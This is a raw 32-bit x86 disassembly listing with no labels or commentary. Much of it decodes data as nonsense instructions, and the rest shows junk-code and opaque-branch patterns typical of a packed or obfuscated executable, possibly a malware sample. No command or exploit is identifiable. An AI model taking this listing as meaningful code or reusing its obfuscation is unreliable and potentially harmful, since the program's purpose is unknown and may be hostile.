  401851:	xor    dh,dl
  401853:	les    eax,FWORD PTR [ecx+0x193f6076]
  401859:	data16 and cl,BYTE PTR [ebx-0x5d832a40]
  401860:	add    al,0xa4
  401862:	lahf   
  401863:	jmp    FWORD PTR [edx-0x11]
  401866:	repz in eax,dx
  401868:	sbb    dh,al
  40186a:	cwde   
  40186b:	ud0    edx,DWORD PTR [edi-0x46]
  40186f:	popa   
  401870:	sbb    DWORD PTR [edi-0x4a],esp
  401873:	in     al,0xb5
  401875:	shl    BYTE PTR [ecx+0x40add5a6],1
  40187b:	sar    DWORD PTR [edx-0x6d045427],cl
  401881:	adc    al,0xa8
  401883:	loopne 0x401896
  401885:	aad    0xf
  401887:	xchg   esi,eax
  401888:	popa   
  401889:	je     0x40183d
  40188b:	leave  
  40188c:	xor    BYTE PTR [ecx+0x7e],dl
  40188f:	ds mov bh,0xee
  401892:	dec    ebp
  401893:	call   0x2c6d:0x7411aab8
  40189a:	or     DWORD PTR [bp+si],edx
  40189d:	xchg   esp,eax
  40189e:	loope  0x4018e3
  4018a0:	es or  edx,esi
  4018a3:	dec    eax
  4018a4:	test   BYTE PTR [esp+ebp*8-0x8],dh
  4018a8:	imul   edx,DWORD PTR [ebx],0x81b0bd9
  4018ae:	ret    0xdad2
  4018b1:	int3   
  4018b2:	(bad)
  4018b6:	leave  
  4018b7:	jno    0x401916
  4018b9:	ds push es
  4018bb:	mov    ds:0x4a91d3bc,al
  4018c0:	jl     0x4018aa
  4018c2:	jne    0x4018e2
  4018c4:	outs   dx,DWORD PTR ds:[esi]
  4018c5:	dec    ebx
  4018c6:	pop    ecx
  4018c7:	dec    ecx
  4018c8:	icebp  
  4018c9:	jge    0x4018a2
  4018cb:	ret    0xdaf3
  4018ce:	stc    
  4018cf:	sbb    dh,al
  4018d1:	(bad)  [esi-0x2904bc9c]
  4018d7:	fmul   st(4),st
  4018d9:	cmp    ebp,DWORD PTR [eax]
  4018db:	lahf   
  4018dc:	jmp    FWORD PTR [ebx-0x52]
  4018df:	inc    edi
  4018e0:	fidiv  DWORD PTR [ebx-0x51]
  4018e3:	dec    esp
  4018e4:	jae    0x40188e
  4018e6:	ret    
  4018e7:	fstp   DWORD PTR [ebx]
  4018e9:	add    BYTE PTR [edx+eiz*1-0x533a745f],ch
  4018f0:	fwait
  4018f1:	and    al,0x62
  4018f3:	jmp    0x401912
  4018f5:	stos   DWORD PTR es:[edi],eax
  4018f6:	pusha  
  4018f7:	clc    
  4018f8:	or     DWORD PTR [edi+0x4e],0xffffffe3
  4018fc:	lds    esi,FWORD PTR [esi]
  4018fe:	sub    bl,0x25
  401901:	or     BYTE PTR [edx-0x2],bh
  401904:	inc    ebx
  401905:	outs   dx,DWORD PTR ds:[esi]
  401906:	sbb    BYTE PTR [edx-0x18c992c3],ah
  40190c:	xchg   edx,eax
  40190d:	sbb    DWORD PTR [ebx],ecx
  40190f:	lods   eax,DWORD PTR ds:[esi]
  401910:	pop    esi
  401911:	jnp    0x40192a
  401913:	cld    
  401914:	mov    cl,0x53
  401916:	cmp    ebp,esp
  401918:	ins    BYTE PTR es:[edi],dx
  401919:	pop    ss
  40191a:	test   DWORD PTR [ebp-0x596a0988],edi
  401920:	lods   eax,DWORD PTR ds:[esi]
  401921:	out    dx,al
  401922:	in     eax,0x54
  401924:	xlat   BYTE PTR ds:[ebx]
  401925:	jp     0x4018fb
  401927:	js     0x268ac583
  40192d:	sbb    edi,DWORD PTR [ecx-0x6c]
  401930:	cmp    ecx,DWORD PTR [ebp+0x46]
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x428287,0x0
  401946:	not    DWORD PTR ds:0x4282ff
  40194c:	mov    edi,DWORD PTR ds:0x4281a3
  401952:	mov    DWORD PTR ds:0x42829f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x42830b,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428287,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d8c
  401981:	mov    edx,DWORD PTR ds:0x4283a7
  401987:	adc    DWORD PTR ds:0x42830f,edx
  40198d:	and    edx,DWORD PTR ds:0x42825f
  401993:	add    DWORD PTR ds:0x42828f,edx
  401999:	mov    edi,DWORD PTR ds:0x428183
  40199f:	xor    DWORD PTR ds:0x4281ab,edi
  4019a5:	and    DWORD PTR ds:0x42817b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42838b
  4019b4:	sub    ecx,DWORD PTR ds:0x42828b
  4019ba:	mov    DWORD PTR ds:0x42838b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42839b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428393,0x339b
  4019e6:	mov    eax,ds:0x4223e0
  4019eb:	cmp    DWORD PTR ds:0x428277,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428287
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428277,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428297
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e78
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428197
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428187
  401a44:	sub    DWORD PTR ds:0x428313,ecx
  401a4a:	add    DWORD PTR ds:0x428193,0x42828b
  401a54:	xor    edx,DWORD PTR ds:0x4282fb
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x4281a3,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x4281a3,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428277
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x42832f,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42827b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x4281a3,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d90
  401ac0:	sub    edx,DWORD PTR ds:0x4283b3
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42839f
  401ad4:	adc    ecx,DWORD PTR ds:0x42818f
  401ada:	mov    DWORD PTR ds:0x42839f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42818b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428173,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428287,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42819f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42817f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428173,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428ee0
  401b3a:	movzx  edx,WORD PTR ds:0x4282af
  401b41:	and    edx,DWORD PTR ds:0x42818b
  401b47:	mov    DWORD PTR ds:0x4282af,edx
  401b4d:	and    DWORD PTR ds:0x428267,edx
  401b53:	add    DWORD PTR ds:0x4283ab,edx
  401b59:	sub    edx,DWORD PTR ds:0x4282b3
  401b5f:	add    DWORD PTR ds:0x42826b,edi
  401b65:	or     edx,DWORD PTR ds:0x428397
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x42831b,0x0
  401b78:	mov    DWORD PTR ds:0x4282b3,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428183,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428257
  401ba1:	cmp    DWORD PTR ds:0x42831b,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428da4
  401bc7:	sub    DWORD PTR ds:0x428307,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42826b
  401bd4:	add    DWORD PTR ds:0x428317,edx
  401bda:	add    DWORD PTR ds:0x42816f,ebx
  401be0:	sbb    DWORD PTR ds:0x42823f,edi
  401be6:	inc    DWORD PTR ds:0x42823f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x4283a3,0x428247
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0xdab0afeb
  401c11:	lods   eax,DWORD PTR ds:[esi]
  401c12:	cdq    
  401c13:	mov    esp,0x18180a25
  401c18:	sahf   
  401c19:	adc    bl,BYTE PTR [eax]
  401c1b:	sbb    BYTE PTR [eax-0x6f],bh
  401c1e:	or     al,0xdf
  401c20:	add    DWORD PTR [ecx+0x5c],edx
  401c23:	fwait
  401c24:	xchg   edi,eax
  401c25:	xor    BYTE PTR [ebp+0x75],ch
  401c28:	pop    ecx
  401c29:	jge    0x401c1f
  401c2b:	inc    edi
  401c2c:	sar    DWORD PTR [ebp+0x38],1
  401c2f:	adc    esp,edi
  401c31:	cmp    al,0x1f
  401c33:	sub    eax,0xb117ac54
  401c38:	jle    0x401c9d
  401c3a:	retf   0x5862
  401c3d:	sub    ch,bl
  401c3f:	adc    bh,bh
  401c41:	pop    esp
  401c42:	xchg   esp,eax
  401c43:	adc    dl,al
  401c45:	fcmovne st,st(4)
  401c47:	sub    ch,BYTE PTR [edi+0x4fb49152]
  401c4d:	enter  0x303c,0x4f
  401c51:	add    edx,DWORD PTR [ecx-0x4e]
  401c54:	add    dh,BYTE PTR [edi-0x2483dca6]
  401c5a:	adc    al,0xd1
  401c5c:	fistp  WORD PTR ds:0x449b6c14
  401c62:	cmc    
  401c63:	pop    esi
  401c64:	or     edi,DWORD PTR [esi]
  401c66:	push   ds
  401c67:	cmp    eax,0x6c2030b7
  401c6c:	add    al,0x96
  401c6e:	mov    WORD PTR [edi+0x5fcbc65c],es
  401c74:	hlt    
  401c75:	in     al,dx
  401c76:	or     ebp,DWORD PTR [ebp+0x47]
  401c79:	mov    ds:0x9a016139,al
  401c7e:	pop    eax
  401c7f:	mov    BYTE PTR [eax-0x6a],ah
  401c82:	ins    DWORD PTR es:[edi],dx
  401c83:	xchg   ebp,eax
  401c84:	mov    ebp,edi
  401c86:	sbb    esp,edx
  401c88:	popa   
  401c89:	mov    gs,ebp
  401c8b:	mov    ch,0x67
  401c8d:	jecxz  0x401c95
  401c8f:	hlt    
  401c90:	jo     0x401d08
  401c92:	fsub   st(6),st
  401c94:	and    eax,0x9fdf6219
  401c99:	dec    DWORD PTR [edi]
  401c9b:	mov    esi,0x8a19d4a
  401ca0:	std    
  401ca1:	imul   edi,esp,0xffffff9f
  401ca4:	add    BYTE PTR [ecx+0x71],ah
  401ca7:	pusha  
  401ca8:	or     al,0x35
  401caa:	je     0x401c92
  401cac:	pop    ds
  401cad:	(bad)  
  401cae:	xchg   esp,eax
  401caf:	pop    edx
  401cb0:	ret    0x462e
  401cb3:	jo     0x401caa
  401cb5:	sub    DWORD PTR es:[eax+edx*1],esi
  401cb9:	out    dx,al
  401cba:	or     bl,BYTE PTR [edi-0x4d223c0d]
  401cc0:	add    dh,BYTE PTR [ebp+0x4]
  401cc3:	inc    edi
  401cc4:	rcr    ah,0x65
  401cc7:	pop    ecx
  401cc8:	rcl    BYTE PTR [edi],0x39
  401ccb:	xlat   BYTE PTR ds:[ebx]
  401ccc:	out    dx,al
  401ccd:	(bad)  
  401cce:	out    0x35,al
  401cd0:	sbb    eax,DWORD PTR [ebx]
  401cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd3:	push   edi
  401cd4:	add    al,0x15
  401cd6:	xchg   edi,eax
  401cd7:	sbb    DWORD PTR [esi+0x195556a2],ebp
  401cdd:	xlat   BYTE PTR ds:[ebx]
  401cde:	bound  edi,QWORD PTR es:[edi-0x7195db28]
  401ce5:	dec    eax
  401ce6:	js     0x401d09
  401ce8:	shl    BYTE PTR [ebx+0x5a],0x91
  401cec:	loope  0x401d31
  401cee:	out    dx,eax
  401cef:	mov    DWORD PTR [edx+0x3fd4ac55],0xa9003c6e
  401cf9:	mov    ?,WORD PTR [edi+0x2]
  401cfc:	mov    ds:0xbf0c1fc2,al
  401d01:	(bad)  
  401d02:	rcr    ah,1
  401d04:	bound  esi,QWORD PTR [ebx]
  401d06:	push   0x47
  401d08:	jle    0x401c92
  401d0a:	mov    al,ds:0xac00e288
  401d0f:	jmp    0x665675a0
  401d14:	leave  
  401d15:	push   eax
  401d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d17:	sahf   
  401d18:	xor    eax,0x66a4fdb3
  401d1d:	ins    DWORD PTR es:[edi],dx
  401d1e:	pop    ss
  401d1f:	push   0x604493df
  401d24:	(bad)  
  401d25:	ficomp DWORD PTR [ebx-0x5b61d404]
  401d2b:	(bad)  
  401d2c:	pushf  
  401d2d:	ja     0x401cc0
  401d2f:	hlt    
  401d30:	sbb    BYTE PTR [edx-0x35b91c87],ch
  401d36:	call   0x7bad068e
  401d3b:	mov    cl,0x5
  401d3d:	pop    eax
  401d3e:	call   0x21f5:0x158d1f46
  401d45:	jae    0x401d34
  401d47:	sub    eax,DWORD PTR [ebp+0x57a4f3e5]
  401d4d:	jae    0x401dc9
  401d4f:	in     al,0x8
  401d51:	mov    esi,0x71f13c6d
  401d56:	jne    0x401d1c
  401d58:	lock dec edi
  401d5a:	pop    edi
  401d5b:	jb     0x401d84
  401d5d:	and    al,0x24
  401d5f:	mov    ah,0xea
  401d61:	inc    esp
  401d62:	call   0xc507389f
  401d67:	sub    DWORD PTR [ebx-0x341e9b6c],0x2d4353d
  401d71:	or     ch,dh
  401d73:	sbb    al,0xfb
  401d75:	call   0x2b446f5b
  401d7a:	sbb    ecx,DWORD PTR [esi-0x186c7ee8]
  401d80:	mov    DWORD PTR [ebx+0x76],esp
  401d83:	add    bl,BYTE PTR [esi-0x25199cd0]
  401d89:	in     al,dx
  401d8a:	push   edi
  401d8b:	js     0x401df4
  401d8d:	iret   
  401d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d8f:	test   BYTE PTR [ecx+edi*4+0x79],cl
  401d93:	push   ss
  401d94:	data16 je 0x401e00
  401d97:	pop    esp
  401d98:	mov    ebx,0x916b59ce
  401d9d:	mov    esi,0x9219260a
  401da2:	pop    ss
  401da3:	xlat   BYTE PTR ds:[ebx]
  401da4:	(bad)  
  401da5:	mov    al,ds:0xd720d49e
  401daa:	out    0x8a,al
  401dac:	cmp    al,0x32
  401dae:	pop    edi
  401daf:	mov    eax,0xe39c085b
  401db4:	push   edi
  401db5:	test   al,0x87
  401db7:	dec    eax
  401db8:	xlat   BYTE PTR ds:[ebx]
  401db9:	pop    es
  401dba:	sub    DWORD PTR [esi],eax
  401dbc:	hlt    
  401dbd:	cdq    
  401dbe:	jp     0x401e05
  401dc0:	aas    
  401dc1:	sub    eax,0x70dbf540
  401dc6:	sub    ch,BYTE PTR [ebp+0x27428b35]
  401dcc:	into   
  401dcd:	sub    eax,DWORD PTR [edx]
  401dcf:	std    
  401dd0:	outs   dx,DWORD PTR ds:[esi]
  401dd1:	and    eax,0xc43aa3f1
  401dd6:	fcomp  DWORD PTR [edi]
  401dd8:	inc    edx
  401dd9:	adc    BYTE PTR [ebx],bl
  401ddb:	inc    edi
  401ddc:	adc    bh,dh
  401dde:	(bad)  
  401ddf:	les    ecx,FWORD PTR ds:0x83f915c6
  401de5:	(bad)  
  401de7:	vpandn ymm3,ymm2,ymm3
  401deb:	xor    ah,BYTE PTR [esi+ecx*1+0x443c6caf]
  401df2:	in     eax,0x13
  401df4:	fdivr  st,st(6)
  401df6:	call   0xd6f4:0x1218741
  401dfd:	push   0x65b526ce
  401e02:	mul    DWORD PTR [edx-0x5f3a5b90]
  401e08:	lea    ebx,ds:0x295526a5
  401e0e:	sub    DWORD PTR [edi],esi
  401e10:	cmc    
  401e11:	out    dx,al
  401e12:	sti    
  401e13:	(bad)  
  401e14:	mov    dl,0x92
  401e16:	jae    0x401dd1
  401e18:	inc    ebp
  401e19:	pop    esi
  401e1a:	retf   0xd8a8
  401e1d:	into   
  401e1e:	cmp    eax,0xaf79752a
  401e23:	les    esp,FWORD PTR [edi+0x5cd2eb97]
  401e29:	ret    
  401e2a:	dec    edx
  401e2b:	push   cs
  401e2c:	push   esp
  401e2d:	mov    ebx,0xf8ee08b9
  401e32:	and    al,0xcf
  401e34:	fucomip st,st(4)
  401e36:	mov    eax,ds:0x39a59d82
  401e3b:	jg     0x401e37
  401e3d:	(bad)  
  401e3e:	leave  
  401e3f:	and    bh,BYTE PTR [esi]
  401e41:	sahf   
  401e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e43:	pop    edi
  401e44:	pushf  
  401e45:	jl     0x401e4c
  401e47:	ret    
  401e48:	loop   0x401e5f
  401e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e4b:	loopne 0x401e3b
  401e4d:	std    
  401e4e:	loop   0x401e6c
  401e50:	int    0x51
  401e52:	mov    bh,BYTE PTR [ebp+0x2c]
  401e55:	mov    ecx,ss
  401e57:	fcom   DWORD PTR [ebp+0x73]
  401e5a:	call   0x9b887524
  401e5f:	(bad)  
  401e60:	cmc    
  401e61:	fbld   TBYTE PTR [edi-0x6f]
  401e64:	mov    ch,0xc1
  401e66:	cld    
  401e67:	adc    al,0x96
  401e69:	loope  0x401ea1
  401e6b:	mov    ch,0x55
  401e6d:	not    BYTE PTR [edx+0x12]
  401e70:	mov    ds:0x9b5426de,al
  401e75:	add    eax,ebx
  401e77:	xchg   DWORD PTR [esi+edx*4],esp
  401e7a:	push   0x1f
  401e7c:	iret   
  401e7d:	hlt    
  401e7e:	jmp    0x401e02
  401e80:	sbb    eax,0x6b9b6ba0
  401e85:	repz sub edi,DWORD PTR [ebp+eiz*2+0x17e08e37]
  401e8d:	jecxz  0x401ed1
  401e8f:	push   esp
  401e90:	in     eax,0xc4
  401e92:	lea    esp,[ebx+ebp*8]
  401e95:	ins    DWORD PTR es:[edi],dx
  401e96:	xor    ecx,DWORD PTR [eax-0x41edbe2f]
  401e9c:	(bad)  
  401e9d:	aam    0x70
  401e9f:	cmp    cl,BYTE PTR [eax+0x7a2fefcf]
  401ea5:	cs out 0xc7,al
  401ea8:	call   0x9704dcaa
  401ead:	cld    
  401eae:	or     ebp,DWORD PTR [ecx+0x70]
  401eb1:	sub    al,0x84
  401eb3:	or     ch,BYTE PTR [eax+ecx*2-0x1f]
  401eb7:	mov    esp,0x5856b664
  401ebc:	addr16 sbb al,0x42
  401ebf:	inc    esp
  401ec0:	addr16 fdivp st(2),st
  401ec3:	sub    ah,BYTE PTR [edx-0x57a5c1a2]
  401ec9:	(bad)
  401ecd:	pop    esi
  401ece:	repz rcr BYTE PTR [edi+0xe5c74bf],1
  401ed5:	xor    cl,al
  401ed7:	mov    bh,0xee
  401ed9:	outs   dx,DWORD PTR ds:[esi]
  401eda:	ror    BYTE PTR [esi-0x6cfa6b7c],0x42
  401ee1:	popf   
  401ee2:	adc    ah,dl
  401ee4:	sbb    eax,0x76395fea
  401ee9:	jnp    0x401e8b
  401eeb:	sub    esp,0x41
  401eee:	xchg   esi,eax
  401eef:	int    0xe1
  401ef1:	popf   
  401ef2:	lods   eax,DWORD PTR ds:[esi]
  401ef3:	loope  0x401eb5
  401ef5:	and    BYTE PTR [ecx+ebp*8],ah
  401ef8:	push   ebx
  401ef9:	dec    ecx
  401efa:	and    BYTE PTR ds:0x43f89ab,dl
  401f00:	rol    BYTE PTR [ebx],cl
  401f02:	pop    esp
  401f03:	jg     0x401f3c
  401f05:	out    dx,eax
  401f06:	arpl   WORD PTR [edi-0x4f691d68],si
  401f0c:	popa   
  401f0d:	jb     0x401e9f
  401f0f:	push   0x9
  401f11:	pop    esi
  401f12:	sbb    eax,0x1eee2c1f
  401f17:	pop    ds
  401f18:	fldcw  WORD PTR [ebp+eax*2-0xc3fddc8]
  401f1f:	cmp    BYTE PTR [edx+edx*2+0x48],0x37
  401f24:	fcomp  DWORD PTR [ebp+eax*1-0x34eb58b9]
  401f2b:	loop   0x401eea
  401f2d:	les    esp,FWORD PTR [ecx-0x4626c97a]
  401f33:	pop    ecx
  401f34:	out    0xf7,al
  401f36:	loope  0x401f43
  401f38:	mov    ebp,0x46421d59
  401f3d:	scas   al,BYTE PTR es:[edi]
  401f3e:	push   0xfabe8588
  401f43:	stc    
  401f44:	std    
  401f45:	cmp    eax,0x115aaaeb
  401f4a:	rcl    BYTE PTR [eax],1
  401f4c:	test   DWORD PTR [edx+edx*1-0x7db58960],esp
  401f53:	pop    edi
  401f54:	mov    cl,0x37
  401f56:	rol    DWORD PTR [ecx-0x354fa4],1
  401f5c:	adc    dh,cl
  401f5e:	jp     0x401f02
  401f60:	or     DWORD PTR [esp+esi*2],0x20899625
  401f67:	add    esi,DWORD PTR ds:[edi+0x43]
  401f6b:	pop    esi
  401f6c:	(bad)  
  401f6d:	dec    esi
  401f6e:	inc    edx
  401f6f:	pusha  
  401f70:	lock dec ebp
  401f72:	call   0x2b8e:0xe0a512f2
  401f79:	inc    edi
  401f7a:	imul   edi,DWORD PTR [ecx],0x7d
  401f7d:	mov    eax,ds:0x2ac160f9
  401f82:	jne    0x401fb5
  401f84:	mulps  xmm4,XMMWORD PTR [ebx+0x46]
  401f88:	adc    eax,0xee56b413
  401f8d:	adc    eax,ebp
  401f8f:	mov    ch,0xdf
  401f91:	sbb    eax,0x26beb14a
  401f96:	dec    ecx
  401f97:	push   cs
  401f98:	fnstsw WORD PTR [ebx-0x695afe40]
  401f9e:	jns    0x401f31
  401fa0:	xchg   edi,eax
  401fa1:	xchg   ebp,eax
  401fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fa3:	in     al,dx
  401fa4:	mov    eax,0xdf073346
  401fa9:	imul   DWORD PTR [esi*8-0x6d7e6990]
  401fb0:	sbb    BYTE PTR cs:[ebp+0x1c3c4273],cl
  401fb7:	div    bh
  401fb9:	jne    0x401f8c
  401fbb:	mov    eax,DWORD PTR [ebp+0x5b32063e]
  401fc1:	fbstp  TBYTE PTR [esi]
  401fc3:	add    eax,DWORD PTR fs:[esi]
  401fc6:	mov    dh,0x6c
  401fc8:	es xor eax,0xaff44997
  401fce:	cmp    BYTE PTR ds:0x1c5fde03,ch
  401fd4:	adc    al,0xee
  401fd6:	repnz sub al,0xf1
  401fd9:	leave  
  401fda:	dec    ecx
  401fdb:	dec    edi
  401fdc:	mov    BYTE PTR [ecx+0x45c7c455],cl
  401fe2:	nop
  401fe3:	push   ebp
  401fe4:	sub    al,0x0
  401fe6:	add    BYTE PTR [ecx+0x42837b],ah
  401fec:	adc    DWORD PTR ds:0x4283b7,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42839b,0x0
  402000:	mov    DWORD PTR ds:0x42829b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428383,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42839b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428da8
  40203e:	or     DWORD PTR ds:0x42817f,0x6f29
  402048:	xor    DWORD PTR ds:0x42831b,0x42830f
  402052:	add    DWORD PTR ds:0x42829b,0x428337
  40205c:	and    DWORD PTR ds:0x4283ab,edi
  402062:	mov    DWORD PTR ds:0x42828b,0x2a04
  40206c:	sub    DWORD PTR ds:0x4281ab,0x42816b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282ff,0x0
  402084:	mov    DWORD PTR ds:0x4282fb,ecx
  40208a:	mov    DWORD PTR ds:0x4281a7,0x59f
  402094:	mov    DWORD PTR ds:0x4281a7,ecx
  40209a:	mov    DWORD PTR ds:0x428327,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282ff,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42817b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428ee4
  4020ce:	sbb    DWORD PTR ds:0x42838b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x42830b,0x42827f
  4020e2:	adc    DWORD PTR ds:0x42837f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42837f,0x4283af
  4020f6:	and    DWORD PTR ds:0x428167,0x428383
  402100:	sbb    DWORD PTR ds:0x42816b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282ff,0x4282af
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282fb
  40213c:	add    DWORD PTR ds:0x428297,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42838b
  40214e:	add    DWORD PTR ds:0x428327,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428177,0x0
  402162:	mov    DWORD PTR ds:0x42839b,0x750f
  40216c:	not    DWORD PTR ds:0x428383
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42827b,0x610f
  402181:	mov    eax,ds:0x42818f
  402186:	cmp    DWORD PTR ds:0x428177,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428079
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e80
  4021b1:	adc    DWORD PTR ds:0x42829f,0x428273
  4021bb:	add    DWORD PTR ds:0x42825f,0x168f
  4021c5:	sub    DWORD PTR ds:0x428303,0x4281a3
  4021cf:	or     DWORD PTR ds:0x4283a3,0xa53
  4021d9:	mov    eax,ds:0x428257
  4021de:	xor    DWORD PTR ds:0x42816b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xbc6564d1
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi-0x5ee7e7ee],bl
  40220e:	sub    al,0x3f
  402210:	fbstp  TBYTE PTR [ebp+0x5f693d4c]
  402216:	sbb    edi,ecx
  402218:	es adc eax,0xd725fc3f
  40221e:	mov    eax,ebx
  402220:	scas   al,BYTE PTR es:[edi]
  402221:	in     al,0xa6
  402223:	stos   BYTE PTR es:[edi],al
  402224:	cmc    
  402225:	test   DWORD PTR [ebp+0x5e128656],ebp
  40222b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40222c:	lea    esi,[edx-0x64446a14]
  402232:	ret    
  402233:	mov    WORD PTR [edi],fs
  402235:	mov    ss,eax
  402237:	repz mov edx,DWORD PTR [ebx]
  40223a:	inc    esp
  40223b:	repz push ss
  40223d:	or     al,0x6a
  40223f:	inc    ecx
  402240:	jecxz  0x402229
  402242:	gs mov eax,0x91ce702b
  402248:	shl    DWORD PTR [ecx],1
  40224a:	or     eax,0xeec6d947
  40224f:	push   eax
  402250:	mov    esi,0xecf2387
  402255:	adc    edx,DWORD PTR [edi-0x80]
  402258:	(bad)  
